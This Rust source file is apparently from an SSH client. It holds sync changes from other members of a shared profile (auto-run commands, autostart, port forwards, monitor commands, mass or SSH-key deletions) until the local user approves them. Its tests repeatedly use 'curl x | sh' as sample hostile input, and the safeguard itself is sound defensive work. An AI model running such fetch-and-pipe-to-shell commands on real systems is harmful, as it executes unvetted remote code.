//! What a shared profile's synced data may set off by itself, held until this
//! device's user allows it.
//!
//! In a shared profile, other people edit servers this device connects to. A
//! few fields make the app act without a click: commands typed into the first
//! terminal on connect (`run_on_connect`), connecting when the profile is
//! unlocked (`autostart`), port forwards started on connect (`tunnels`), and
//! the monitor's custom commands, run on every poll. A change to one of those
//! that comes in through sync in a shared profile is held here until the user
//! allows it, or changes that value themselves.
//!
//! Held items are device-local: the table isn't synced, and nobody else's
//! "allow" counts here. Personal profiles sync only between the user's own
//! devices and never get an entry, and neither does anything that was already
//! there when this was added: it keeps working as before.
//!
//! An entry is (server uuid, item), the item being one of
//!   `run_on_connect`, `autostart`, `tunnel:<type>|<local>|<remote>`,
//!   `metric:<command>`.
//!
//! Deletions are held the same way when one sync would take out much of a
//! shared profile at once, or an SSH key (see `hold_deletions`).

use std::collections::{BTreeSet, HashMap, HashSet};

use rusqlite::{params, Connection, OptionalExtension};

use crate::tunnel::TunnelSpec;

pub const RUN_ON_CONNECT: &str = "run_on_connect";
pub const AUTOSTART: &str = "autostart";

/// The same guard the sync stamp triggers use: true unless the merge engine is
/// applying remote records.
const NOT_MERGING: &str = "COALESCE((SELECT val FROM sync_flags WHERE key='merge'),0)=0";

/// A forward is the same forward when its type, local side and target match
/// (as `TunnelSpec`'s equality has it); its name and stopped flag don't count.
pub fn tunnel_item(spec: &TunnelSpec) -> String {
    format!("tunnel:{}|{}|{}", spec.kind, spec.local, spec.remote)
}

pub fn metric_item(command: &str) -> String {
    format!("metric:{command}")
}

// The SQL spellings of the two item sets, for the triggers. They must match
// `tunnel_item` / `metric_item` exactly.
const NEW_TUNNEL_ITEMS: &str = "SELECT 'tunnel:' || json_extract(value, '$.type') || '|' || json_extract(value, '$.local') || '|' || COALESCE(json_extract(value, '$.remote'), '') \
     FROM json_each(CASE WHEN json_valid(NEW.tunnels) THEN NEW.tunnels ELSE '[]' END)";
const NEW_METRIC_ITEMS: &str = "SELECT 'metric:' || json_extract(value, '$.command') \
     FROM json_each(CASE WHEN json_valid(NEW.custom_metrics) THEN NEW.custom_metrics ELSE '[]' END)";

/// The table, and the triggers that keep it honest without every command
/// having to: a value the user changes on this device is theirs, so its held
/// entry goes; an entry whose forward or command no longer exists goes; a
/// deleted server takes its entries along. None of them fire for the merge
/// engine's own writes except the deletes, which are cleanup either way.
pub fn create_schema(conn: &Connection) -> Result<(), String> {
    let ddl = format!(
        "CREATE TABLE IF NOT EXISTS held_approvals (uuid TEXT NOT NULL, item TEXT NOT NULL, since INTEGER NOT NULL, PRIMARY KEY (uuid, item));
         CREATE TABLE IF NOT EXISTS held_deletions (uuid TEXT PRIMARY KEY, entity_type TEXT NOT NULL, updated_at TEXT NOT NULL, since INTEGER NOT NULL);
         DROP TRIGGER IF EXISTS servers_held_au;
         DROP TRIGGER IF EXISTS servers_held_ad;
         DROP TRIGGER IF EXISTS monitor_configs_held_au;
         DROP TRIGGER IF EXISTS monitor_configs_held_ad;
         CREATE TRIGGER servers_held_au AFTER UPDATE ON servers FOR EACH ROW WHEN NEW.uuid IS NOT NULL AND {NOT_MERGING}
         BEGIN
           DELETE FROM held_approvals WHERE uuid = NEW.uuid AND item = '{RUN_ON_CONNECT}'
             AND (NEW.run_on_connect IS NOT OLD.run_on_connect OR TRIM(COALESCE(NEW.run_on_connect, '')) = '');
           DELETE FROM held_approvals WHERE uuid = NEW.uuid AND item = '{AUTOSTART}'
             AND (NEW.autostart IS NOT OLD.autostart OR COALESCE(NEW.autostart, 0) = 0);
           DELETE FROM held_approvals WHERE uuid = NEW.uuid AND item LIKE 'tunnel:%'
             AND item NOT IN ({NEW_TUNNEL_ITEMS});
         END;
         CREATE TRIGGER servers_held_ad AFTER DELETE ON servers FOR EACH ROW WHEN OLD.uuid IS NOT NULL
         BEGIN DELETE FROM held_approvals WHERE uuid = OLD.uuid; END;
         CREATE TRIGGER monitor_configs_held_au AFTER UPDATE ON monitor_configs FOR EACH ROW WHEN {NOT_MERGING}
         BEGIN
           DELETE FROM held_approvals WHERE uuid = (SELECT uuid FROM servers WHERE id = NEW.node_id) AND item LIKE 'metric:%'
             AND item NOT IN ({NEW_METRIC_ITEMS});
         END;
         CREATE TRIGGER monitor_configs_held_ad AFTER DELETE ON monitor_configs FOR EACH ROW
         BEGIN DELETE FROM held_approvals WHERE uuid = (SELECT uuid FROM servers WHERE id = OLD.node_id) AND item LIKE 'metric:%'; END;"
    );
    conn.execute_batch(&ddl).map_err(|e| format!("[SYNC] HELD_APPROVALS: {e}"))
}

/// The table is there (it's made when a vault opens; bare test databases
/// don't have it).
pub fn ready(conn: &Connection) -> bool {
    conn.query_row(
        "SELECT 1 FROM sqlite_master WHERE type = 'table' AND name = 'held_approvals'",
        [],
        |_| Ok(()),
    )
    .is_ok()
}

/// A profile is shared once it has a share id (owner or member).
pub fn profile_is_shared(conn: &Connection) -> bool {
    conn.query_row("SELECT 1 FROM sync_meta WHERE key = 'share_id'", [], |_| Ok(()))
        .is_ok()
}

/// The tables whose records can carry something that runs by itself.
pub fn watches(table: &str) -> bool {
    table == "servers" || table == "monitor_configs"
}

/// What a row would set off by itself, read just before and just after the
/// merge engine applies a record to it.
pub enum Snapshot {
    Server { run_on_connect: String, autostart: bool, tunnels: BTreeSet<String> },
    Monitor { server_uuid: Option<String>, metrics: BTreeSet<String> },
}

fn tunnel_items_of(json: &str) -> BTreeSet<String> {
    serde_json::from_str::<Vec<TunnelSpec>>(json)
        .map(|specs| specs.iter().map(tunnel_item).collect())
        .unwrap_or_default()
}

/// Read leniently: a list the monitor can't parse runs nothing anyway, but
/// any command in it is still something to hold.
fn metric_items_of(json: &str) -> BTreeSet<String> {
    serde_json::from_str::<Vec<serde_json::Value>>(json)
        .map(|list| {
            list.iter()
                .filter_map(|m| m.get("command").and_then(|c| c.as_str()))
                .filter(|c| !c.trim().is_empty())
                .map(metric_item)
                .collect()
        })
        .unwrap_or_default()
}

pub fn snapshot(conn: &Connection, table: &str, uuid: &str) -> Option<Snapshot> {
    match table {
        "servers" => conn
            .query_row(
                "SELECT COALESCE(run_on_connect, ''), COALESCE(autostart, 0), COALESCE(tunnels, '[]') FROM servers WHERE uuid = ?1",
                [uuid],
                |r| Ok((r.get::<_, String>(0)?, r.get::<_, i64>(1)?, r.get::<_, String>(2)?)),
            )
            .optional()
            .ok()
            .flatten()
            .map(|(roc, auto, tunnels)| Snapshot::Server {
                run_on_connect: roc,
                autostart: auto != 0,
                tunnels: tunnel_items_of(&tunnels),
            }),
        "monitor_configs" => conn
            .query_row(
                "SELECT s.uuid, COALESCE(mc.custom_metrics, '[]') FROM monitor_configs mc
                   LEFT JOIN servers s ON s.id = mc.node_id
                  WHERE mc.uuid = ?1",
                [uuid],
                |r| Ok((r.get::<_, Option<String>>(0)?, r.get::<_, String>(1)?)),
            )
            .optional()
            .ok()
            .flatten()
            .map(|(server_uuid, customs)| Snapshot::Monitor { server_uuid, metrics: metric_items_of(&customs) }),
        _ => None,
    }
}

fn hold(conn: &Connection, uuid: &str, item: &str) -> Result<(), String> {
    conn.execute(
        "INSERT OR IGNORE INTO held_approvals (uuid, item, since) VALUES (?1, ?2, strftime('%s','now'))",
        params![uuid, item],
    )
    .map(|_| ())
    .map_err(|e| format!("[SYNC] HOLD: {e}"))
}

fn release(conn: &Connection, uuid: &str, item: &str) -> Result<(), String> {
    conn.execute("DELETE FROM held_approvals WHERE uuid = ?1 AND item = ?2", params![uuid, item])
        .map(|_| ())
        .map_err(|e| format!("[SYNC] RELEASE: {e}"))
}

/// Drop held entries under `prefix` that aren't in `keep`.
fn release_missing(conn: &Connection, uuid: &str, prefix: &str, keep: &BTreeSet<String>) -> Result<(), String> {
    let held = held_for(conn, uuid);
    for item in held.iter().filter(|i| i.starts_with(prefix) && !keep.contains(*i)) {
        release(conn, uuid, item)?;
    }
    Ok(())
}

/// After the merge engine applied a record (`before` is the row as it was, or
/// None for a new row): hold whatever the record newly turned on, and drop
/// held entries for what it turned off or removed. A record that changed
/// nothing on these fields leaves everything as it was.
pub fn hold_changes(conn: &Connection, table: &str, uuid: &str, before: Option<&Snapshot>) -> Result<(), String> {
    match (table, snapshot(conn, table, uuid)) {
        ("servers", Some(Snapshot::Server { run_on_connect, autostart, tunnels })) => {
            let (b_roc, b_auto, b_tunnels) = match before {
                Some(Snapshot::Server { run_on_connect, autostart, tunnels }) => {
                    (Some(run_on_connect.as_str()), *autostart, Some(tunnels))
                }
                _ => (None, false, None),
            };
            if run_on_connect.trim().is_empty() {
                release(conn, uuid, RUN_ON_CONNECT)?;
            } else if b_roc != Some(run_on_connect.as_str()) {
                hold(conn, uuid, RUN_ON_CONNECT)?;
            }
            if !autostart {
                release(conn, uuid, AUTOSTART)?;
            } else if !b_auto {
                hold(conn, uuid, AUTOSTART)?;
            }
            for item in tunnels.iter().filter(|t| b_tunnels.map_or(true, |b| !b.contains(*t))) {
                hold(conn, uuid, item)?;
            }
            release_missing(conn, uuid, "tunnel:", &tunnels)
        }
        ("monitor_configs", Some(Snapshot::Monitor { server_uuid: Some(server_uuid), metrics })) => {
            let b_metrics = match before {
                Some(Snapshot::Monitor { metrics, .. }) => Some(metrics),
                _ => None,
            };
            for item in metrics.iter().filter(|m| b_metrics.map_or(true, |b| !b.contains(*m))) {
                hold(conn, &server_uuid, item)?;
            }
            release_missing(conn, &server_uuid, "metric:", &metrics)
        }
        _ => Ok(()),
    }
}

/// The held items of one server.
pub fn held_for(conn: &Connection, uuid: &str) -> BTreeSet<String> {
    let Ok(mut stmt) = conn.prepare("SELECT item FROM held_approvals WHERE uuid = ?1") else {
        return BTreeSet::new();
    };
    stmt.query_map([uuid], |r| r.get::<_, String>(0))
        .map(|rows| rows.filter_map(|r| r.ok()).collect())
        .unwrap_or_default()
}

/// Every server's held items, by server uuid.
pub fn held_by_server(conn: &Connection) -> HashMap<String, Vec<String>> {
    let mut out: HashMap<String, Vec<String>> = HashMap::new();
    let Ok(mut stmt) = conn.prepare("SELECT uuid, item FROM held_approvals ORDER BY uuid, item") else {
        return out;
    };
    if let Ok(rows) = stmt.query_map([], |r| Ok((r.get::<_, String>(0)?, r.get::<_, String>(1)?))) {
        for (uuid, item) in rows.flatten() {
            out.entry(uuid).or_default().push(item);
        }
    }
    out
}

/// Allow some of a server's held items, or all of them when `items` is empty.
/// Returns how many were let go.
pub fn allow(conn: &Connection, uuid: &str, items: &[String]) -> Result<usize, String> {
    if items.is_empty() {
        return conn
            .execute("DELETE FROM held_approvals WHERE uuid = ?1", [uuid])
            .map_err(|e| format!("[SYNC] ALLOW: {e}"));
    }
    let mut n = 0;
    for item in items {
        n += conn
            .execute("DELETE FROM held_approvals WHERE uuid = ?1 AND item = ?2", params![uuid, item])
            .map_err(|e| format!("[SYNC] ALLOW: {e}"))?;
    }
    Ok(n)
}

/// Saved forwards about to start a session's forwarding: the held ones come
/// in stopped, so they show in the list but nothing runs them until the user
/// starts one (which allows it) or allows them. Returns how many were held.
pub fn hold_tunnels(conn: &Connection, server_uuid: Option<&str>, specs: &mut [TunnelSpec]) -> usize {
    let Some(uuid) = server_uuid else { return 0 };
    let held = held_for(conn, uuid);
    let mut n = 0;
    for spec in specs.iter_mut() {
        if !spec.stopped && held.contains(&tunnel_item(spec)) {
            spec.stopped = true;
            n += 1;
        }
    }
    n
}

/// `hold_tunnels` over a server's saved `tunnels` column, for the code that
/// seeds a session from the JSON. Anything it can't read goes back unchanged
/// (the seeding reports the parse error itself).
pub fn hold_tunnels_json(conn: &Connection, server_id: i64, json: String) -> String {
    let Some(uuid) = server_uuid(conn, server_id) else { return json };
    let Ok(mut specs) = serde_json::from_str::<Vec<TunnelSpec>>(&json) else { return json };
    if hold_tunnels(conn, Some(&uuid), &mut specs) == 0 {
        return json;
    }
    serde_json::to_string(&specs).unwrap_or(json)
}

/// Custom monitor commands about to run: the held ones are left out.
pub fn without_held_metrics(
    conn: &Connection,
    server_uuid: Option<&str>,
    customs: Vec<crate::monitor::CustomMetric>,
) -> Vec<crate::monitor::CustomMetric> {
    let Some(uuid) = server_uuid else { return customs };
    let held = held_for(conn, uuid);
    if !held.iter().any(|i| i.starts_with("metric:")) {
        return customs;
    }
    customs
        .into_iter()
        .filter(|m| !held.contains(&metric_item(&m.command)))
        .collect()
}

// ---- Deletions ----------------------------------------------------------

/// More rows than this deleted in one sync, when that's also more than a
/// quarter of the profile, and the deletions wait for the user.
const MASS_DELETE_MIN: usize = 10;

/// Which of a shared profile's incoming deletions not to apply now. Someone
/// else's sync can delete things here too, and a sync that deletes much of the
/// profile at once (more than `MASS_DELETE_MIN` rows and more than a quarter
/// of it) or any SSH key, which lives nowhere but in vaults, waits for this
/// device's user: all of that sync's deletions are held. Those held before
/// stay held. The rows stay until the user deletes them here too, or keeps
/// them, which brings them back for everyone (`resolve_held_deletions`).
pub fn hold_deletions(conn: &Connection, tombstones: &[&crate::SyncRecord]) -> Result<HashSet<String>, String> {
    let mut skip = HashSet::new();
    let mut fresh = Vec::new();
    for t in tombstones {
        if !crate::SYNCED_TABLES.contains(&t.entity_type.as_str()) {
            continue;
        }
        let held = conn
            .query_row("SELECT 1 FROM held_deletions WHERE uuid = ?1", [&t.uuid], |_| Ok(()))
            .optional()
            .map_err(|e| format!("[SYNC] HELD_DELETE: {e}"))?
            .is_some();
        if held {
            conn.execute(
                "UPDATE held_deletions SET updated_at = ?2 WHERE uuid = ?1 AND updated_at < ?2",
                params![t.uuid, t.updated_at],
            )
            .map_err(|e| format!("[SYNC] HELD_DELETE: {e}"))?;
            skip.insert(t.uuid.clone());
            continue;
        }
        // Only a deletion that would take a row away here counts.
        let local: Option<Option<String>> = conn
            .query_row(&format!("SELECT updated_at FROM {} WHERE uuid = ?1", t.entity_type), [&t.uuid], |r| r.get(0))
            .optional()
            .map_err(|e| format!("[SYNC] HELD_DELETE: {e}"))?;
        if local.is_some_and(|ua| ua.as_deref().unwrap_or("") < t.updated_at.as_str()) {
            fresh.push(*t);
        }
    }
    let live: usize = crate::SYNCED_TABLES
        .iter()
        .map(|t| {
            conn.query_row(&format!("SELECT COUNT(*) FROM {t} WHERE uuid IS NOT NULL"), [], |r| r.get::<_, i64>(0))
                .unwrap_or(0) as usize
        })
        .sum();
    let a_key = fresh.iter().any(|t| t.entity_type == "ssh_keys");
    if a_key || (fresh.len() > MASS_DELETE_MIN && fresh.len() * 4 > live) {
        for t in &fresh {
            conn.execute(
                "INSERT INTO held_deletions (uuid, entity_type, updated_at, since) VALUES (?1, ?2, ?3, strftime('%s','now'))
                 ON CONFLICT(uuid) DO UPDATE SET updated_at = excluded.updated_at",
                params![t.uuid, t.entity_type, t.updated_at],
            )
            .map_err(|e| format!("[SYNC] HELD_DELETE: {e}"))?;
            skip.insert(t.uuid.clone());
        }
    }
    Ok(skip)
}

/// A held deletion, for the user to decide on: what it would delete.
#[derive(serde::Serialize)]
pub struct HeldDeletion {
    pub uuid: String,
    pub entity_type: String,
    pub name: String,
}

/// The deletions held on this device, with the name of what each would
/// delete. One whose row is gone already (deleted here meanwhile) isn't
/// listed.
pub fn held_deletions(conn: &Connection) -> Vec<HeldDeletion> {
    let Ok(mut stmt) = conn.prepare("SELECT uuid, entity_type FROM held_deletions ORDER BY entity_type, since") else {
        return Vec::new();
    };
    let held: Vec<(String, String)> = stmt
        .query_map([], |r| Ok((r.get(0)?, r.get(1)?)))
        .map(|rows| rows.filter_map(Result::ok).collect())
        .unwrap_or_default();
    held.into_iter()
        .filter(|(_, t)| crate::SYNCED_TABLES.contains(&t.as_str()))
        .filter_map(|(uuid, t)| {
            let name = match t.as_str() {
                "commands" | "notes" => "title",
                "monitor_configs" => "(SELECT s.name FROM servers s WHERE s.id = node_id)",
                _ => "name",
            };
            let name: Option<String> = conn
                .query_row(&format!("SELECT {name} FROM {t} WHERE uuid = ?1"), [&uuid], |r| r.get(0))
                .optional()
                .ok()?
                .map(|n: Option<String>| n.unwrap_or_default());
            name.map(|name| HeldDeletion { uuid, entity_type: t, name })
        })
        .collect()
}

/// A server's uuid from its local id.
pub fn server_uuid(conn: &Connection, server_id: i64) -> Option<String> {
    conn.query_row("SELECT uuid FROM servers WHERE id = ?1", [server_id], |r| r.get::<_, Option<String>>(0))
        .ok()
        .flatten()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The real column set the triggers and snapshots read, plus the side
    /// tables they rely on.
    fn db() -> Connection {
        let conn = Connection::open_in_memory().unwrap();
        conn.execute_batch(
            "CREATE TABLE servers(id INTEGER PRIMARY KEY, name TEXT, tunnels TEXT, autostart INTEGER NOT NULL DEFAULT 0,
                                  run_on_connect TEXT NOT NULL DEFAULT '', position INTEGER NOT NULL DEFAULT 0, uuid TEXT);
             CREATE TABLE monitor_configs(node_id INTEGER PRIMARY KEY, enabled_metrics TEXT, custom_metrics TEXT, paused INTEGER NOT NULL DEFAULT 1, uuid TEXT);
             CREATE TABLE sync_flags(key TEXT PRIMARY KEY, val INTEGER NOT NULL);
             CREATE TABLE sync_meta(key TEXT PRIMARY KEY, value TEXT NOT NULL);",
        )
        .unwrap();
        create_schema(&conn).unwrap();
        conn
    }

    fn merging(conn: &Connection, on: bool) {
        conn.execute(
            "INSERT INTO sync_flags(key,val) VALUES('merge',?1) ON CONFLICT(key) DO UPDATE SET val=excluded.val",
            [on as i64],
        )
        .unwrap();
    }

    /// What the merge engine does for one server record: upsert by uuid with
    /// the merge flag on, then hold what changed.
    fn merge_server(conn: &Connection, uuid: &str, roc: &str, autostart: bool, tunnels: &str) {
        merging(conn, true);
        let before = snapshot(conn, "servers", uuid);
        let updated = conn
            .execute(
                "UPDATE servers SET tunnels=?1, autostart=?2, run_on_connect=?3 WHERE uuid=?4",
                params![tunnels, autostart as i64, roc, uuid],
            )
            .unwrap();
        if updated == 0 {
            conn.execute(
                "INSERT INTO servers(name, tunnels, autostart, run_on_connect, uuid) VALUES('s', ?1, ?2, ?3, ?4)",
                params![tunnels, autostart as i64, roc, uuid],
            )
            .unwrap();
        }
        hold_changes(conn, "servers", uuid, before.as_ref()).unwrap();
        merging(conn, false);
    }

    const L8080: &str = r#"[{"type":"L","local":"127.0.0.1:8080","remote":"db:5432"}]"#;
    const L8080_D1080: &str = r#"[{"type":"L","local":"127.0.0.1:8080","remote":"db:5432"},{"type":"D","local":"0.0.0.0:1080"}]"#;

    #[test]
    fn sqlite_has_the_json_functions_the_triggers_use() {
        let conn = Connection::open_in_memory().unwrap();
        let n: i64 = conn
            .query_row("SELECT COUNT(*) FROM json_each(?1)", [L8080_D1080], |r| r.get(0))
            .unwrap();
        assert_eq!(n, 2);
    }

    #[test]
    fn a_synced_new_server_holds_everything_it_would_run() {
        let conn = db();
        merge_server(&conn, "u1", "curl x | sh", true, L8080_D1080);
        let held = held_for(&conn, "u1");
        assert!(held.contains(RUN_ON_CONNECT));
        assert!(held.contains(AUTOSTART));
        assert!(held.contains("tunnel:L|127.0.0.1:8080|db:5432"));
        assert!(held.contains("tunnel:D|0.0.0.0:1080|"));
        assert_eq!(held.len(), 4);
    }

    #[test]
    fn a_synced_server_with_nothing_to_run_holds_nothing() {
        let conn = db();
        merge_server(&conn, "u1", "", false, "[]");
        assert!(held_for(&conn, "u1").is_empty());
    }

    #[test]
    fn only_what_a_record_changes_is_held() {
        let conn = db();
        // Already on this device, allowed (no entries).
        conn.execute(
            "INSERT INTO servers(name, tunnels, autostart, run_on_connect, uuid) VALUES('s', ?1, 1, 'ls', 'u1')",
            [L8080],
        )
        .unwrap();
        // A co-member adds a SOCKS listener and leaves the rest alone.
        merge_server(&conn, "u1", "ls", true, L8080_D1080);
        let held = held_for(&conn, "u1");
        assert_eq!(held.into_iter().collect::<Vec<_>>(), vec!["tunnel:D|0.0.0.0:1080|".to_string()]);
        // Then changes the commands.
        merge_server(&conn, "u1", "ls; curl x | sh", true, L8080_D1080);
        assert!(held_for(&conn, "u1").contains(RUN_ON_CONNECT));
    }

    #[test]
    fn turning_things_off_or_removing_them_releases_them() {
        let conn = db();
        merge_server(&conn, "u1", "curl x | sh", true, L8080_D1080);
        merge_server(&conn, "u1", "", false, L8080);
        let held = held_for(&conn, "u1");
        assert_eq!(held.into_iter().collect::<Vec<_>>(), vec!["tunnel:L|127.0.0.1:8080|db:5432".to_string()]);
    }

    #[test]
    fn the_users_own_change_on_this_device_is_theirs() {
        let conn = db();
        merge_server(&conn, "u1", "curl x | sh", true, L8080_D1080);
        // Editing the commands here: no longer held.
        conn.execute("UPDATE servers SET run_on_connect='uptime' WHERE uuid='u1'", []).unwrap();
        assert!(!held_for(&conn, "u1").contains(RUN_ON_CONNECT));
        // Saving the same autostart value back (the form does) is not an OK.
        conn.execute("UPDATE servers SET autostart=1 WHERE uuid='u1'", []).unwrap();
        assert!(held_for(&conn, "u1").contains(AUTOSTART));
        // Stopping or renaming one forward doesn't release the other.
        conn.execute(
            "UPDATE servers SET tunnels=?1 WHERE uuid='u1'",
            [r#"[{"type":"L","local":"127.0.0.1:8080","remote":"db:5432","stopped":true},{"type":"D","local":"0.0.0.0:1080","name":"x"}]"#],
        )
        .unwrap();
        assert!(held_for(&conn, "u1").contains("tunnel:D|0.0.0.0:1080|"));
        // Removing it does.
        conn.execute("UPDATE servers SET tunnels=?1 WHERE uuid='u1'", [L8080]).unwrap();
        assert!(!held_for(&conn, "u1").contains("tunnel:D|0.0.0.0:1080|"));
    }

    #[test]
    fn the_merge_engines_own_writes_release_nothing_by_trigger() {
        // With the merge flag on, the local-edit trigger stays out of it:
        // only hold_changes decides what a merged record holds or releases.
        let conn = db();
        conn.execute("INSERT INTO held_approvals(uuid,item,since) VALUES('u1','run_on_connect',0)", []).unwrap();
        conn.execute("INSERT INTO servers(name, run_on_connect, uuid) VALUES('s','a','u1')", []).unwrap();
        merging(&conn, true);
        conn.execute("UPDATE servers SET run_on_connect='b' WHERE uuid='u1'", []).unwrap();
        merging(&conn, false);
        assert!(held_for(&conn, "u1").contains(RUN_ON_CONNECT));
    }

    #[test]
    fn held_forwards_start_stopped_and_held_metrics_are_left_out() {
        let conn = db();
        merge_server(&conn, "u1", "", false, L8080_D1080);
        allow(&conn, "u1", &["tunnel:L|127.0.0.1:8080|db:5432".into()]).unwrap();
        let mut specs: Vec<TunnelSpec> = serde_json::from_str(L8080_D1080).unwrap();
        assert_eq!(hold_tunnels(&conn, Some("u1"), &mut specs), 1);
        assert!(!specs[0].stopped);
        assert!(specs[1].stopped);

        conn.execute("INSERT INTO held_approvals(uuid,item,since) VALUES('u1','metric:curl x | sh',0)", []).unwrap();
        let mk = |cmd: &str| crate::monitor::CustomMetric {
            id: "m".into(),
            name: "m".into(),
            command: cmd.into(),
            parse: "text".into(),
            regex: None,
            display: "text".into(),
            unit: None,
        };
        let kept = without_held_metrics(&conn, Some("u1"), vec![mk("uptime"), mk("curl x | sh")]);
        assert_eq!(kept.len(), 1);
        assert_eq!(kept[0].command, "uptime");
    }

    #[test]
    fn monitor_commands_are_held_per_command_and_released_when_gone() {
        let conn = db();
        conn.execute("INSERT INTO servers(id, name, uuid) VALUES(7, 's', 'u7')", []).unwrap();
        let set = |customs: &str, merge: bool| {
            if merge {
                merging(&conn, true);
            }
            let before = snapshot(&conn, "monitor_configs", "m7");
            conn.execute(
                "INSERT INTO monitor_configs(node_id, enabled_metrics, custom_metrics, uuid) VALUES(7, '[]', ?1, 'm7')
                 ON CONFLICT(node_id) DO UPDATE SET custom_metrics=excluded.custom_metrics",
                [customs],
            )
            .unwrap();
            if merge {
                hold_changes(&conn, "monitor_configs", "m7", before.as_ref()).unwrap();
                merging(&conn, false);
            }
        };
        set(r#"[{"id":"a","name":"a","command":"uptime","parse":"text"}]"#, false);
        set(r#"[{"id":"a","name":"a","command":"uptime","parse":"text"},{"id":"b","name":"b","command":"curl x | sh","parse":"text"}]"#, true);
        assert_eq!(held_for(&conn, "u7").into_iter().collect::<Vec<_>>(), vec!["metric:curl x | sh".to_string()]);
        // The user removes it on this device.
        set(r#"[{"id":"a","name":"a","command":"uptime","parse":"text"}]"#, false);
        assert!(held_for(&conn, "u7").is_empty());
    }

    #[test]
    fn deleting_a_server_drops_its_entries() {
        let conn = db();
        merge_server(&conn, "u1", "curl x | sh", true, "[]");
        conn.execute("DELETE FROM servers WHERE uuid='u1'", []).unwrap();
        assert!(held_for(&conn, "u1").is_empty());
    }
}
